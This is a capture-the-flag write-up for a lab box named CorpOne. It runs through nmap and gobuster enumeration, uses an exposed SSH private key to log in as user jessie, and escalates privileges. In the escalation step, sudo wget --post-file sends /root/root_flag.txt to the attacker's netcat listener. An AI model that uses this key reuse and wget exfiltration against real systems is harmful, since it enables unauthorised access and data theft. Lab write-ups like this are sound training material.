**Tristan Gomez**


nmap
```
─$ sudo nmap -sV 10.10.210.190                                                                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 11:57 PDT
Nmap scan report for 10.10.210.190
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds

```
` <!-- Jessie don't forget to udate the webiste -->`

gobuster
```
└─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.216.29
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt,js
[+] Timeout:                 10s
===============================================================
2021/12/12 12:26:09 Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11374]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 277]  
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.216.29/sitemap

```

```
└─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.216.29/sitemap
===============================================================                                                                                                        
Gobuster v3.1.0                                                                                                                                                        
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                          
===============================================================
[+] Url:                     http://10.10.216.29/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,php,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/12 12:33:04 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.216.29/sitemap/.ssh/]
/about.html           (Status: 200) [Size: 12232]   
/blog.html
/contact.html
/css
/fonts
/images
/index.html
/js
/shop.html
/services.html
/work.html
```

Oooooh! In the /.ssh directory, I found a private `id_rsa` key. I copied it onto my machine. We have the name `jessie` so lets try to ssh in using the key we just found. Woo! it works without a passphrase!

```
jessie@CorpOne:~$ 
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```

```
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
    
jessie@CorpOne:~/Documents$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

```


```
sudo wget --post-file=/root/root_flag.txt http://10.8.248.108:1111
--2021-12-12 22:49:22--  http://10.8.248.108:1111/
Connecting to 10.8.248.108:1111... connected.
HTTP request sent, awaiting response... No data received.
Retrying.

```

```
└─$ sudo nc -nvlp 1111
[sudo] password for gomez22: 
listening on [any] 1111 ...
connect to [10.8.248.108] from (UNKNOWN) [10.10.216.29] 46280
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.8.248.108:1111
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

```
